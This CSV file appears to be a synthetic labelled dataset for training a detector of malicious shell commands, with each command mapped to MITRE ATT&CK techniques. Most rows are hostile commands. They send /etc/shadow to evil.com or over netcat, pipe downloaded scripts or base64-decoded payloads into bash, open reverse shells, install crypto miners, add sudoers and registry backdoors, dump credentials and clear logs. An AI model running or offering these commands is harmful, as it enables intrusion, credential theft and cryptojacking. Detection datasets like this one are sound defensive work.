time who | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time python3 exploit.py --target localhost ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 ; sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup chmod 644 /etc/hosts &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
time at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1053_Scheduled_Task'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time net user /add attacker P@ssw0rd ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/passwd | awk -F: '$3 >= 1000'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1087_Account_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c ""getent group sudo ; chmod +x /tmp/payload""","[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
wmic useraccount list | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
dmesg  |  head  -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
sudo su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""find /var/log -name '*.log' -exec truncate -s 0 {} \;""","[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1070_Indicator_Removal'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl  -X  POST  http://evil.com/collect  -d  @/etc/shadow  &&  history  -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
fping  -a  -g  192.168.1.0/24  2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time at now + 1 minute <<< '/tmp/payload' | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow && echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time psexec.py Administrator:password@10.0.0.5 cmd.exe | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""cat /etc/shadow | nc 10.0.0.99 4444""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
crontab -e | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"bash -c ""echo 'aGVsbG8=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'aGVsbG8='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup find /home -name '*.conf' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'dW5hbWUgLWE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'bmV0IHVzZXIgL2RvbWFpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""unshadow /etc/passwd /etc/shadow > crackme""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8n' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""net localgroup administrators""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"bash -c ""cat /etc/passwd | grep -v nologin""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers ; sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup w | echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1112_Modify_Registry'],synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup echo 'Y2F0IC9ldGMvcmVzb2x2LmNvbmY=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; history -c""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser  --shell  /bin/bash  --disabled-password  backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""su - admin""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
ls -la /root /etc /var/www && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
fping -a -g 192.168.1.0/24 2>/dev/null && history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4gfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
id  -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./CVE-2021-4034 | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
crontab -e,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1053_Scheduled_Task'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""nc -e /bin/bash attacker.com 80 ; chmod +x /tmp/payload""","[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
ip route show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""nmcli connection show""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
id -Gn ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip neigh show ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
